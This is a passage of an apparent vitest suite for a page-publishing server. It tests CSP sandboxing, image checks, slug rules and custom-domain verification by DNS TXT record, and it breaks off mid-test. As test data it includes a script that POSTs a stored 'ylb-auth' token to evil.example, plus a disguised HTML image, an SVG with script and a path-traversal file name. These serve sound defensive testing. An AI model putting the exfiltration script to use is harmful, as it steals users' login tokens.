// Published pages (server/pages.mjs), mostly through the real ai-server.mjs against the Supabase and DNS
// stand-ins: pages at https://<app>/<name> in a CSP sandbox, their images, names (format, reserved,
// taken, renamed), unpublishing, the limits, people's own domains (proven by a TXT record, served on
// their Host without the sandbox, home page, robots.txt, sitemap.xml, looked at again, taken over only
// with the DNS's say-so), hosts that aren't the app's (never the app or /api), and requests built to hurt.
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import fs from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { createAuth } from './auth.mjs';
import { claimable, clientOf, createPages, hostOf, imageTypeOf, normalizeDomain, txtResolver } from './pages.mjs';
import { createMockDns } from './test/mock-dns.mjs';
import { createMockSupabase } from './test/mock-supabase.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const tmpDir = () => fs.mkdtempSync(path.join(os.tmpdir(), 'ylb-pages-'));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// small files with the right first bytes (what the server checks; it never decodes the picture)
const PNG = Buffer.concat([Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex'), Buffer.alloc(40, 7)]);
const JPEG = Buffer.concat([Buffer.from('ffd8ffe000104a46494600', 'hex'), Buffer.alloc(40, 3)]);
const GIF = Buffer.concat([Buffer.from('GIF89a', 'latin1'), Buffer.alloc(40, 1)]);
const WEBP = Buffer.concat([Buffer.from('RIFF', 'latin1'), Buffer.from([0x24, 0, 0, 0]), Buffer.from('WEBPVP8 ', 'latin1'), Buffer.alloc(40, 2)]);
const image = (name, mime, bytes) => ({ name, mime, data: bytes.toString('base64') });

const ARTIFACT_CSP = 'sandbox allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-modals allow-downloads';
const SEO_CSP = 'sandbox allow-forms allow-popups allow-popups-to-escape-sandbox';
const MIGRATION_HINT = 'Run supabase/migrations/20261103040000_published_pages.sql in Supabase → SQL Editor.';
const TOKEN = /^ylb-[0-9a-f]{40}$/;
const VERSION = /^[0-9a-z]{1,12}-[0-9a-f]{10}$/;

async function freePort() {
  const s = http.createServer();
  await new Promise((r) => s.listen(0, '127.0.0.1', r));
  const { port } = s.address();
  await new Promise((r) => s.close(r));
  return port;
}

// each request a visitor of its own (as the platform's proxy would say), unless a test says who it is
let visitors = 0;
const nextVisitor = () => {
  visitors++;
  return `198.18.${(visitors >> 8) & 255}.${visitors & 255}`;
};

/** Any request, with any Host header (fetch can't set one). */
function request(base, pathname, { host, method = 'GET', headers = {}, body } = {}) {
  const u = new URL(base);
  return new Promise((resolve, reject) => {
    // content-length: Node frames a DELETE or OPTIONS body only when it's given
    const length = body === undefined ? {} : { 'content-length': Buffer.byteLength(body) };
    const req = http.request({ host: u.hostname, port: u.port, path: pathname, method, headers: { ...(host ? { host } : {}), 'x-forwarded-for': nextVisitor(), ...length, ...headers } }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const buf = Buffer.concat(chunks);
        resolve({ status: res.statusCode, headers: res.headers, buf, text: buf.toString('utf8') });
      });
    });
    req.on('error', reject);
    req.end(body);
  });
}

/** A request written by hand (a target no HTTP client sends): the status line of the answer, or '' if none came. */
function raw(base, text) {
  const u = new URL(base);
  return new Promise((resolve) => {
    let reply = '';
    const s = net.connect(Number(u.port), u.hostname, () => s.write(text));
    s.on('data', (d) => (reply += d));
    const done = () => resolve(reply.split('\r\n')[0]);
    s.on('close', done);
    s.on('error', done);
    setTimeout(() => s.destroy(), 3000);
  });
}

let supa;
let dnsServer;
let child;
let app;
let alice;
let bob;
let serverLog = '';

/** The real ai-server.mjs against the stand-ins. */
async function startServer(env = {}) {
  const port = await freePort();
  const proc = spawn(process.execPath, [path.join(here, 'ai-server.mjs')], {
    env: {
      PATH: process.env.PATH,
      PORT: String(port),
      HOST: '127.0.0.1',
      DATA_DIR: tmpDir(),
      SUPABASE_URL: supa.url,
      SUPABASE_PUBLISHABLE_KEY: supa.PUBLISHABLE,
      SUPABASE_SECRET_KEY: supa.SECRET,
      ADMIN_EMAILS: 'owner@example.com',
      RATE_LIMIT_PER_MIN: '1000',
      PAGES_DNS_SERVERS: dnsServer.server,
      ...env,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  let out = '';
  proc.stdout.on('data', (d) => (out += d));
  proc.stderr.on('data', (d) => (out += d));
  await new Promise((resolve, reject) => {
    const t = setInterval(() => {
      // the line after "Publishing pages: on" says where the app answers
      if (/Publishing pages: on[^\n]*\n[^\n]*\n[^\n]*\n/.test(out)) {
        clearInterval(t);
        resolve();
      }
    }, 20);
    proc.on('exit', (code) => reject(new Error(`server exited ${code}: ${out}`)));
    setTimeout(() => reject(new Error(`server didn’t start: ${out}`)), 15_000);
  });
  return { proc, base: `http://127.0.0.1:${port}`, log: () => out };
}

beforeAll(async () => {
  supa = await (await createMockSupabase()).start();
  dnsServer = await createMockDns();
  const s = await startServer();
  child = s.proc;
  app = { base: s.base };
  serverLog = s.log();
  alice = await supa.tokenFor('alice@pages.test');
  bob = await supa.tokenFor('bob@pages.test');
}, 30_000);

afterAll(async () => {
  child?.kill();
  await dnsServer?.close();
  await supa?.close();
});

const api = (pathname, { who, method = 'GET', body, headers = {} } = {}) =>
  fetch(`${app.base}${pathname}`, { method, headers: { 'content-type': 'application/json', ...(who ? { authorization: `Bearer ${who.token}` } : {}), ...headers }, ...(body === undefined ? {} : { body: JSON.stringify(body) }) });
const publish = (who, pageId, fields) =>
  api(`/api/pages/${encodeURIComponent(pageId)}`, { who, method: 'PUT', body: { kind: pageId.split(':')[0], title: 'A page', html: `<!doctype html><title>${pageId}</title><p>Hello from ${pageId}</p>`, images: [], ...fields } });
const get = (pathname, opts) => request(app.base, pathname, opts);
const at = (host, pathname, opts) => get(pathname, { ...opts, host });
const rowsOf = (table) => supa.tables.get(table) ?? [];
const addDomain = (who, domain) => api('/api/domains', { who, method: 'POST', body: { domain } });
const checkDomain = async (who, domain) => (await api(`/api/domains/${domain}/check`, { who, method: 'POST' })).json();
/** The domain's TXT record in the stand-in DNS (no values: the name is there without a TXT record). */
const txt = (domain, ...values) => dnsServer.records.set(`_ylb-domain.${domain}`, values);
const objectsUnder = (prefix) => [...supa.objects.keys()].filter((k) => k.startsWith(prefix));

describe('publishing on the app’s address', () => {
  it('needs someone signed in, on the app’s own page', async () => {
    let r = await api('/api/pages');
    expect(r.status).toBe(401);
    expect((await r.json()).code).toBe('AUTH_REQUIRED');
    r = await publish(null, 'seo:nobody', { slug: 'nobody-page' });
    expect(r.status).toBe(401);
    r = await api('/api/pages', { who: alice, headers: { origin: 'https://evil.example' } });
    expect(r.status).toBe(403);
    const cfg = await (await fetch(`${app.base}/api/config`)).json();
    expect(cfg.pages).toEqual({ enabled: true });
  });

  it('checks names: their format, the app’s own names, and names already taken', async () => {
    const check = async (slug, pageId, who = alice) => (await api(`/api/pages/check?slug=${encodeURIComponent(slug)}&pageId=${encodeURIComponent(pageId)}`, { who })).json();
    for (const slug of ['ab', 'Shop_Page', '-shop', 'shop-', 'a'.repeat(61), 'my page']) expect(await check(slug, 'seo:a1'), slug).toEqual({ ok: false, reason: 'format' });
    for (const slug of ['api', 'login', 'sitemap', 'well-known', 'yourlocalbusiness']) expect(await check(slug, 'seo:a1'), slug).toEqual({ ok: false, reason: 'reserved' });
    expect(await check('my-shop-page', 'seo:a1')).toEqual({ ok: true });

    expect((await publish(bob, 'seo:bob1', { slug: 'bobs-candles' })).status).toBe(200);
    expect(await check('bobs-candles', 'seo:a1')).toEqual({ ok: false, reason: 'taken' });
    expect(await check('bobs-candles', 'seo:bob1', bob)).toEqual({ ok: true }); // his own page keeps its name
    expect(await check('bobs-candles', 'artifact:other', bob)).toEqual({ ok: false, reason: 'taken' });

    let r = await publish(alice, 'seo:a1', { slug: 'login' });
    expect(r.status).toBe(400);
    expect(await r.json()).toMatchObject({ code: 'BAD_SLUG', reason: 'reserved' });
    r = await publish(alice, 'seo:a1', { slug: 'Bad Name' });
    expect(await r.json()).toMatchObject({ code: 'BAD_SLUG', reason: 'format' });
    r = await publish(alice, 'seo:a1', { slug: 'bobs-candles' });
    expect(r.status).toBe(409);
    expect((await r.json()).code).toBe('SLUG_TAKEN');
    expect((await publish(alice, 'notes:a1', { slug: 'alice-notes' })).status).toBe(400); // not a page id
  });

  it('publishes a page and serves it in a sandbox (scripts only for artifacts)', async () => {
    const html = '<!doctype html><title>Widget</title><button onclick="go()">Go</button><script>function go(){}</script>';
    let r = await publish(alice, 'artifact:widget1', { slug: 'alice-widget', title: 'Price calculator', html });
    expect(r.status).toBe(200);
    const out = await r.json();
    expect(out).toEqual({
      page: { pageId: 'artifact:widget1', kind: 'artifact', slug: 'alice-widget', title: 'Price calculator', domain: null, home: false, updatedAt: expect.any(String), url: `${app.base}/alice-widget` },
      url: `${app.base}/alice-widget`,
    });
    for (const p of ['/alice-widget', '/alice-widget/']) {
      const page = await get(p);
      expect(page.status, p).toBe(200);
      expect(page.text).toBe(html);
      expect(page.headers).toMatchObject({
        'content-type': 'text/html; charset=utf-8',
        'cache-control': 'public, max-age=60',
        'x-content-type-options': 'nosniff',
        'referrer-policy': 'strict-origin-when-cross-origin',
        'content-security-policy': ARTIFACT_CSP,
      });
      // never the app's origin (its sign-in lives in localStorage there), and embedding stays allowed
      expect(page.headers['content-security-policy']).not.toContain('allow-same-origin');
      expect(page.headers['x-frame-options']).toBeUndefined();
    }
    const head = await get('/alice-widget', { method: 'HEAD' });
    expect(head.status).toBe(200);
    expect(head.buf.length).toBe(0);
    expect(Number(head.headers['content-length'])).toBe(Buffer.byteLength(html));

    r = await publish(alice, 'seo:proj1', { slug: 'alice-candles', html: '<!doctype html><h1>Candles</h1><script>alert(1)</script>' });
    expect(r.status).toBe(200);
    expect((await get('/alice-candles')).headers['content-security-policy']).toBe(SEO_CSP);

    const list = await (await api('/api/pages', { who: alice })).json();
    expect(list.appOrigin).toBe(app.base);
    expect(list.pages.map((p) => p.slug).sort()).toEqual(['alice-candles', 'alice-widget']);
    expect(list.domains).toEqual([]);
    // bob doesn't see alice's pages
    expect((await (await api('/api/pages', { who: bob })).json()).pages.map((p) => p.slug)).toEqual(['bobs-candles']);

    // a name nobody published: a plain "not found" page that doesn't name the app
    const missing = await get('/nobody-published-this');
    expect(missing.status).toBe(404);
    expect(missing.headers['content-type']).toBe('text/html; charset=utf-8');
    expect(missing.text).toContain('Page not found');
    expect(missing.text.toLowerCase()).not.toContain('yourlocalbusiness');
  });

  it('stores only text Postgres can keep, and caps the title (however long it is)', async () => {
    let r = await publish(alice, 'artifact:text1', { slug: 'alice-text', html: '<p>a\u0000b \ud83d</p>', title: `${'é'.repeat(299)}😀😀` });
    expect(r.status).toBe(200);
    let row = rowsOf('published_pages').find((p) => p.slug === 'alice-text');
    expect(row.html).toBe('<p>ab �</p>');
    expect(Array.from(row.title)).toHaveLength(300);
    expect(row.title.endsWith('😀')).toBe(true); // whole characters only
    // millions of characters: cut before they're counted
    const t0 = Date.now();
    r = await publish(alice, 'artifact:text1', { slug: 'alice-text', title: '😀'.repeat(1_500_000) });
    expect(r.status).toBe(200);
    expect(Date.now() - t0).toBeLessThan(3000);
    row = rowsOf('published_pages').find((p) => p.slug === 'alice-text');
    expect(row.title).toBe('😀'.repeat(300));
  });

  it('serves the images listed with the page, and only those', async () => {
    let r = await publish(alice, 'seo:proj2', {
      slug: 'alice-gallery',
      html: '<img src="/alice-gallery/img/img-1.png" alt="Shop front"><img src="/alice-gallery/img/img-2.jpg" alt="Candles">',
      images: [image('img-1.png', 'image/png', PNG), image('img-2.jpg', 'image/jpeg', JPEG)],
    });
    expect(r.status).toBe(200);
    const folder = `media/${alice.user.id}/published/seo-proj2`;
    const listed = rowsOf('published_pages').find((p) => p.slug === 'alice-gallery').images;
    expect(listed).toEqual([
      { name: 'img-1.png', mime: 'image/png', size: PNG.length, sha256: expect.stringMatching(/^[0-9a-f]{64}$/), v: expect.stringMatching(VERSION) },
      { name: 'img-2.jpg', mime: 'image/jpeg', size: JPEG.length, sha256: expect.stringMatching(/^[0-9a-f]{64}$/), v: listed[0].v },
    ]);
    // each publish keeps its images in a folder of its own
    const v1 = listed[0].v;
    expect(supa.objects.get(`${folder}/${v1}/img-1.png`)?.bytes.equals(PNG)).toBe(true);
    const pic = await get('/alice-gallery/img/img-1.png');
    expect(pic.status).toBe(200);
    expect(pic.buf.equals(PNG)).toBe(true);
    expect(pic.headers).toMatchObject({ 'content-type': 'image/png', 'cache-control': 'public, max-age=86400', 'x-content-type-options': 'nosniff', 'content-security-policy': "default-src 'none'; sandbox" });
    expect((await get('/alice-gallery/img/img-2.jpg')).headers['content-type']).toBe('image/jpeg');
    // in the folder, but not listed with the page
    supa.objects.set(`${folder}/${v1}/img-9.png`, { bytes: PNG, type: 'image/png', created: Date.now() });
    expect((await get('/alice-gallery/img/img-9.png')).status).toBe(404);
    expect((await get('/alice-gallery/img/notes.txt')).status).toBe(404);
    // republished without the first image: the old folder goes from storage, and the image stops answering
    r = await publish(alice, 'seo:proj2', { slug: 'alice-gallery', html: '<img src="/alice-gallery/img/img-2.jpg" alt="">', images: [image('img-2.jpg', 'image/jpeg', JPEG)] });
    expect(r.status).toBe(200);
    const v2 = rowsOf('published_pages').find((p) => p.slug === 'alice-gallery').images[0].v;
    expect(v2).not.toBe(v1);
    expect(objectsUnder(`${folder}/`)).toEqual([`${folder}/${v2}/img-2.jpg`]);
    expect((await get('/alice-gallery/img/img-1.png')).status).toBe(404);
    expect((await get('/alice-gallery/img/img-2.jpg')).status).toBe(200);
  });

  it('serves only the exact image checked at publishing, even if the stored file changes', async () => {
    expect((await publish(alice, 'artifact:gif1', { slug: 'alice-animation', images: [image('img-1.gif', 'image/gif', GIF), image('img-2.webp', 'image/webp', WEBP), image('img-3.png', 'image/png', PNG)] })).status).toBe(200);
    const { v } = rowsOf('published_pages').find((p) => p.slug === 'alice-animation').images[0];
    const folder = `media/${alice.user.id}/published/artifact-gif1/${v}`;
    // people can write to their own folder directly: an HTML file in place of an image…
    supa.objects.set(`${folder}/img-1.gif`, { bytes: Buffer.from('<script>steal()</script>'), type: 'text/html', created: Date.now() });
    expect((await get('/alice-animation/img/img-1.gif')).status).toBe(404);
    // …or another picture that wasn't checked
    supa.objects.set(`${folder}/img-3.png`, { bytes: Buffer.concat([PNG, Buffer.from('changed')]), type: 'image/png', created: Date.now() });
    expect((await get('/alice-animation/img/img-3.png')).status).toBe(404);
    const webp = await get('/alice-animation/img/img-2.webp');
    expect(webp.status).toBe(200);
    expect(webp.headers['content-type']).toBe('image/webp');
  });

  it('a publish that fails changes nothing: the live page keeps its images, the new ones go, and Postgres’s words stay inside', async () => {
    expect((await publish(alice, 'seo:keep1', { slug: 'alice-keeps', images: [image('img-1.png', 'image/png', PNG)] })).status).toBe(200);
    const { v } = rowsOf('published_pages').find((p) => p.slug === 'alice-keeps').images[0];
    const folder = `media/${alice.user.id}/published/seo-keep1`;
    supa.behavior.fail = (method, pathname) => (method === 'POST' && pathname === '/rest/v1/published_pages' ? { status: 500, body: { code: '57014', message: 'canceling statement due to statement timeout on secret_table_7' } } : null);
    let r;
    try {
      r = await publish(alice, 'seo:keep1', { slug: 'alice-keeps', images: [image('img-1.png', 'image/png', Buffer.concat([PNG, Buffer.from('new')]))] });
    } finally {
      supa.behavior.fail = null;
    }
    expect(r.status).toBe(502);
    const body = await r.json();
    expect(body).toEqual({ error: 'Supabase refused that (error 500). Try again.', code: 'UPSTREAM' });
    // the live page's image is the one it was published with, and nothing else was left behind
    expect(objectsUnder(`${folder}/`)).toEqual([`${folder}/${v}/img-1.png`]);
    expect(supa.objects.get(`${folder}/${v}/img-1.png`).bytes.equals(PNG)).toBe(true);
    expect((await get('/alice-keeps/img/img-1.png')).buf.equals(PNG)).toBe(true);
  });

  it('moves a page to its new name: the old name stops working at once and is free again', async () => {
    expect((await publish(alice, 'artifact:rename1', { slug: 'first-name' })).status).toBe(200);
    expect((await get('/first-name')).status).toBe(200);
    const r = await publish(alice, 'artifact:rename1', { slug: 'second-name' });
    expect(r.status).toBe(200);
    expect((await r.json()).url).toBe(`${app.base}/second-name`);
    expect((await get('/first-name')).status).toBe(404);
    expect((await get('/second-name')).status).toBe(200);
    expect(rowsOf('published_pages').filter((p) => p.page_id === 'artifact:rename1')).toHaveLength(1);
    expect((await publish(bob, 'seo:bob2', { slug: 'first-name' })).status).toBe(200);
    expect((await get('/first-name')).text).toContain('seo:bob2');
    // and a page can't be moved onto a name someone else has
    expect((await publish(alice, 'artifact:rename1', { slug: 'first-name' })).status).toBe(409);
  });

  it('unpublishing takes the page and its images down', async () => {
    expect((await publish(alice, 'seo:gone1', { slug: 'alice-leaving', images: [image('img-1.png', 'image/png', PNG)] })).status).toBe(200);
    expect((await get('/alice-leaving/img/img-1.png')).status).toBe(200);
    const r = await api(`/api/pages/${encodeURIComponent('seo:gone1')}`, { who: alice, method: 'DELETE' });
    expect(r.status).toBe(200);
    expect(await r.json()).toEqual({ ok: true });
    expect((await get('/alice-leaving')).status).toBe(404);
    expect((await get('/alice-leaving/img/img-1.png')).status).toBe(404);
    expect(objectsUnder(`media/${alice.user.id}/published/seo-gone1/`)).toEqual([]);
    expect(rowsOf('published_pages').some((p) => p.page_id === 'seo:gone1')).toBe(false);
    // bob can't unpublish alice's page
    await api(`/api/pages/${encodeURIComponent('artifact:widget1')}`, { who: bob, method: 'DELETE' });
    expect((await get('/alice-widget')).status).toBe(200);
  });

  it('refuses pages and images over the limits, and images that aren’t what they say', async () => {
    const tooLong = `<p>${'x'.repeat(1_500_000)}</p>`;
    let r = await publish(alice, 'seo:big1', { slug: 'alice-big', html: tooLong });
    expect(r.status).toBe(413);
    expect((await r.json()).code).toBe('TOO_LARGE');
    const bad = async (images) => {
      const res = await publish(alice, 'seo:img1', { slug: 'alice-images', images });
      return { status: res.status, ...(await res.json()) };
    };
    const thirteen = Array.from({ length: 13 }, (_, i) => image(`img-${i + 1}.png`, 'image/png', PNG));
    expect(await bad(thirteen)).toMatchObject({ status: 400, code: 'BAD_IMAGE' });
    expect(await bad([image('../x.png', 'image/png', PNG)])).toMatchObject({ status: 400, code: 'BAD_IMAGE' });
    expect(await bad([image('img-1.png', 'image/png', PNG), image('img-1.png', 'image/png', PNG)])).toMatchObject({ status: 400, code: 'BAD_IMAGE' });
    expect(await bad([image('img-1.png', 'image/svg+xml', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>x()</script></svg>'))])).toMatchObject({ status: 400, code: 'BAD_IMAGE' });
    expect(await bad([image('img-1.png', 'image/png', JPEG)])).toMatchObject({ status: 400, code: 'BAD_IMAGE' });
    expect(await bad([image('img-1.jpg', 'image/png', PNG)])).toMatchObject({ status: 400, code: 'BAD_IMAGE' });
    expect(await bad([{ name: 'img-1.png', mime: 'image/png', data: 'not base64 at all!' }])).toMatchObject({ status: 400, code: 'BAD_IMAGE' });
    const huge = Buffer.concat([PNG, Buffer.alloc(3 * 1024 * 1024, 1)]);
    expect(await bad([image('img-1.png', 'image/png', huge)])).toMatchObject({ status: 400, code: 'BAD_IMAGE' });
    // twelve are fine
    expect((await bad(thirteen.slice(0, 12))).status).toBe(200);
    expect(rowsOf('published_pages').some((p) => p.slug === 'alice-big')).toBe(false);
    // the kind must match the page id, and a home page needs a domain
    r = await api(`/api/pages/${encodeURIComponent('seo:kind1')}`, { who: alice, method: 'PUT', body: { kind: 'artifact', slug: 'alice-kind', html: '<p>x</p>' } });
    expect(r.status).toBe(400);
    r = await publish(alice, 'seo:home0', { slug: 'alice-home', home: true });
    expect(r.status).toBe(400);
    r = await publish(alice, 'seo:empty', { slug: 'alice-empty', html: '   ' });
    expect(r.status).toBe(400);
    // a domain that isn't one isn't quietly left off
    r = await publish(alice, 'seo:dom0', { slug: 'alice-dom0', domain: 'not a domain at all' });
    expect(r.status).toBe(400);
  });
});

describe('people’s own domains', () => {
  let shopToken;

  it('adds a domain, proves it with a TXT record, and only then serves its pages there, without the sandbox', async () => {
    let r = await addDomain(alice, 'https://Shop.Example.com:443/about');
    expect(r.status).toBe(200);
    const added = await r.json();
    shopToken = added.token;
    expect(added).toEqual({ domain: 'shop.example.com', token: expect.stringMatching(TOKEN), verified: false, verifiedAt: null, record: { type: 'TXT', name: '_ylb-domain.shop.example.com', value: added.token } });
    // adding it again changes nothing
    expect(await (await addDomain(alice, 'shop.example.com.')).json()).toEqual(added);
    for (const domain of ['', 'localhost', '127.0.0.1', '[::1]', 'my-app.replit.app', 'preview.replit.dev', 'shop.localhost', 'printer.local', 'db.internal', 'not a domain', 'nodot']) {
      r = await addDomain(bob, domain);
      expect(r.status, domain).toBe(400);
      expect((await r.json()).code, domain).toBe('BAD_DOMAIN');
    }

    // a page on it waits for the TXT record
    r = await publish(alice, 'seo:shop1', { slug: 'candle-shop', domain: 'shop.example.com', html: '<!doctype html><h1>Candle shop</h1><img src="/candle-shop/img/img-1.png" alt="">', images: [image('img-1.png', 'image/png', PNG)] });
    expect(r.status).toBe(200);
    expect(await r.json()).toMatchObject({ url: `${app.base}/candle-shop`, domainUrl: 'https://shop.example.com/candle-shop', page: { domain: 'shop.example.com', home: false } });
    expect((await at('shop.example.com', '/candle-shop')).status).toBe(404);
    // no record yet, then one with another value
    expect(await checkDomain(alice, 'shop.example.com')).toEqual({ verified: false, error: expect.stringContaining('There’s no TXT record at _ylb-domain.shop.example.com yet') });
    txt('shop.example.com');
    expect(await checkDomain(alice, 'shop.example.com')).toEqual({ verified: false, error: expect.stringContaining('no TXT record') });
    txt('shop.example.com', 'v=spf1 -all', 'ylb-0000000000000000000000000000000000000000');
    expect(await checkDomain(alice, 'shop.example.com')).toEqual({ verified: false, error: expect.stringContaining('not with this account’s value') });
    expect((await at('shop.example.com', '/candle-shop')).status).toBe(404);
    // the DNS can't answer: nothing changes, and it says so
    dnsServer.records.set('_ylb-domain.shop.example.com', 'SERVFAIL');
    expect(await checkDomain(alice, 'shop.example.com')).toEqual({ verified: false, error: expect.stringContaining('didn’t get an answer') });

    // the record: it's hers
    txt('shop.example.com', 'v=spf1 -all', shopToken);
    const checked = await checkDomain(alice, 'shop.example.com');
    expect(checked).toEqual({ verified: true, domain: { ...added, verified: true, verifiedAt: expect.any(String) } });
    expect((await (await api('/api/pages', { who: alice })).json()).domains).toEqual([checked.domain]);
    // the check asked the DNS, never the domain itself (which this server may answer)
    expect(dnsServer.asked.some((q) => q.name === '_ylb-domain.shop.example.com' && q.type === 16)).toBe(true);
    expect((await at('shop.example.com', '/.well-known/ylb-domain-check')).status).toBe(404);

    const page = await at('shop.example.com', '/candle-shop');
    expect(page.status).toBe(200);
    expect(page.text).toContain('Candle shop');
    expect(page.headers['content-security-policy']).toBeUndefined(); // its own origin: no sandbox
    expect(page.headers).toMatchObject({ 'content-type': 'text/html; charset=utf-8', 'x-content-type-options': 'nosniff', 'referrer-policy': 'strict-origin-when-cross-origin' });
    expect((await at('shop.example.com', '/candle-shop/')).status).toBe(200);
    expect((await at('shop.example.com', '/candle-shop', { method: 'HEAD' })).status).toBe(200);
    expect((await at('shop.example.com', '/candle-shop/img/img-1.png')).buf.equals(PNG)).toBe(true);
    // still on the app's address too, sandboxed there
    expect((await get('/candle-shop')).headers['content-security-policy']).toBe(SEO_CSP);
    // other people's pages (and alice's pages not on this domain) aren't on it
    expect((await at('shop.example.com', '/bobs-candles')).status).toBe(404);
    expect((await at('shop.example.com', '/alice-widget')).status).toBe(404);
    // no home page yet
    expect((await at('shop.example.com', '/')).status).toBe(404);
    // only the domain's owner can put pages on it
    r = await publish(bob, 'seo:bob3', { slug: 'bob-on-alices', domain: 'shop.example.com' });
    expect(r.status).toBe(400);
    expect((await r.json()).code).toBe('DOMAIN_NOT_YOURS');
  });

  it('has one home page, a robots.txt and a sitemap', async () => {
    let r = await publish(alice, 'seo:shop1', { slug: 'candle-shop', domain: 'shop.example.com', home: true, html: '<h1>Candle shop</h1>' });
    expect(await r.json()).toMatchObject({ domainUrl: 'https://shop.example.com/', page: { home: true } });
    expect((await at('shop.example.com', '/')).text).toContain('Candle shop');
    // another page becomes the home page: the first stays at its own name
    r = await publish(alice, 'artifact:shop2', { slug: 'scent-quiz', domain: 'shop.example.com', home: true, html: '<h1>Scent quiz</h1>' });
    expect(r.status).toBe(200);
    expect((await at('shop.example.com', '/')).text).toContain('Scent quiz');
    expect((await at('shop.example.com', '/candle-shop')).text).toContain('Candle shop');
    expect(rowsOf('published_pages').find((p) => p.slug === 'candle-shop').home).toBe(false);

    const robots = await at('shop.example.com', '/robots.txt');
    expect(robots.text).toBe('User-agent: *\nAllow: /\nSitemap: https://shop.example.com/sitemap.xml\n');
    const sitemap = await at('shop.example.com', '/sitemap.xml');
    expect(sitemap.headers['content-type']).toBe('application/xml; charset=utf-8');
    expect(sitemap.text).toContain('<loc>https://shop.example.com/</loc>');
    expect(sitemap.text).toContain('<loc>https://shop.example.com/candle-shop</loc>');
    expect(sitemap.text).not.toContain('scent-quiz'); // listed once, as the home page
    expect(sitemap.text).not.toContain('bobs-candles');
  });

  it('never shows the app or the API on someone’s domain', async () => {
    const asJson = (res) => /application\/json/.test(String(res.headers['content-type']));
    for (const p of ['/api/config', '/api/health', '/api/pages', '/assets/index.js', '/index.html', '/login']) {
      const res = await at('shop.example.com', p, { headers: { authorization: `Bearer ${alice.token}` } });
      expect(res.status, p).toBe(404);
      expect(asJson(res), p).toBe(false);
      expect(res.text, p).toContain('Page not found');
      expect(res.text.toLowerCase(), p).not.toContain('yourlocalbusiness');
    }
    for (const method of ['POST', 'PUT', 'DELETE', 'OPTIONS']) {
      const res = await at('shop.example.com', '/api/domains', { method, headers: { authorization: `Bearer ${alice.token}`, 'content-type': 'application/json' }, body: method === 'OPTIONS' ? undefined : '{"domain":"x.example.com"}' });
      expect(res.status, method).toBe(405);
      expect(asJson(res), method).toBe(false);
    }
  });

  it('lets another account take a domain over only with its own TXT record', async () => {
    const mallory = await supa.tokenFor('mallory@pages.test');
    // mallory adds bob's domain first (she doesn't control its DNS), and puts a page on it
    expect((await addDomain(mallory, 'bobs-bakery.example.com')).status).toBe(200);
    const steal = '<!doctype html><script>fetch("https://evil.example/c",{method:"POST",body:localStorage.getItem("ylb-auth")})</script>';
    expect((await publish(mallory, 'artifact:m1', { slug: 'mallory-home', domain: 'bobs-bakery.example.com', home: true, html: steal })).status).toBe(200);
    // it isn't hers: nothing shows there, and her check says why
    expect(await checkDomain(mallory, 'bobs-bakery.example.com')).toMatchObject({ verified: false, error: expect.stringContaining('no TXT record') });
    const there = await at('bobs-bakery.example.com', '/');
    expect(there.status).toBe(404);
    expect(there.text).not.toContain('ylb-auth');

    // bob adds it: another account has it, and here's the record that moves it to his
    let r = await addDomain(bob, 'bobs-bakery.example.com');
    expect(r.status).toBe(409);
    const taken = await r.json();
    expect(taken).toMatchObject({ code: 'DOMAIN_TAKEN', domain: { domain: 'bobs-bakery.example.com', verified: false, verifiedAt: null, record: { type: 'TXT', name: '_ylb-domain.bobs-bakery.example.com', value: expect.stringMatching(TOKEN) } } });
    const malloryValue = (await (await api('/api/pages', { who: mallory })).json()).domains.find((d) => d.domain === 'bobs-bakery.example.com').record.value;
    expect(taken.domain.record.value).not.toBe(malloryValue);
    // a record with mallory's value (or none) moves nothing
    txt('bobs-bakery.example.com', malloryValue);
    expect(await checkDomain(bob, 'bobs-bakery.example.com')).toMatchObject({ verified: false, error: expect.stringContaining('not with this account’s value') });
    expect(rowsOf('published_domains').find((d) => d.domain === 'bobs-bakery.example.com').user_id).toBe(mallory.user.id);

    // with bob's record it's his, in one step; mallory's page stays published, on the app's address only
    txt('bobs-bakery.example.com', taken.domain.record.value);
    expect(await checkDomain(bob, 'bobs-bakery.example.com')).toEqual({ verified: true, domain: { ...taken.domain, verified: true, verifiedAt: expect.any(String) } });
    expect(rowsOf('published_domains').find((d) => d.domain === 'bobs-bakery.example.com')).toMatchObject({ user_id: bob.user.id, token: taken.domain.record.value });
    expect(rowsOf('published_pages').find((p) => p.slug === 'mallory-home')).toMatchObject({ domain: null, home: false });
    expect((await get('/mallory-home')).headers['content-security-policy']).toBe(ARTIFACT_CSP);
    expect((await (await api('/api/pages', { who: mallory })).json()).domains.map((d) => d.domain)).not.toContain('bobs-bakery.example.com');
    r = await publish(mallory, 'artifact:m1', { slug: 'mallory-home', domain: 'bobs-bakery.example.com', home: true, html: steal });
    expect((await r.json()).code).toBe('DOMAIN_NOT_YOURS');
    expect((await publish(bob, 'seo:bakery1', { slug: 'bobs-bakery', domain: 'bobs-bakery.example.com', home: true, html: '<h1>Bob’s bakery</h1>' })).status).toBe(200);
    expect((await at('bobs-bakery.example.com', '/')).text).toContain('Bob’s bakery');
    expect((await at('bobs-bakery.example.com', '/mallory-home')).status).toBe(404);
    // and she can't take it back without a record of her own
    expect(await checkDomain(mallory, 'bobs-bakery.example.com')).toMatchObject({ verified: false });
    expect(rowsOf('published_domains').find((d) => d.domain === 'bobs-bakery.example.com').user_id).toBe(bob.user.id);
  });

  it('takes the previous owner’s pages off a domain before it changes hands, so nothing of theirs stays on it', async () => {
    const trent = await supa.tokenFor('trent@pages.test');
    const peggy = await supa.tokenFor('peggy@pages.test');
    // trent added peggy's domain first and made a page its home page (he never had its TXT record)
    expect((await addDomain(trent, 'peggys-pies.example.com')).status).toBe(200);
    expect((await publish(trent, 'seo:t1', { slug: 'trent-pies', domain: 'peggys-pies.example.com', home: true })).status).toBe(200);
    const claim = await (await addDomain(peggy, 'peggys-pies.example.com')).json();
    txt('peggys-pies.example.com', claim.domain.record.value);
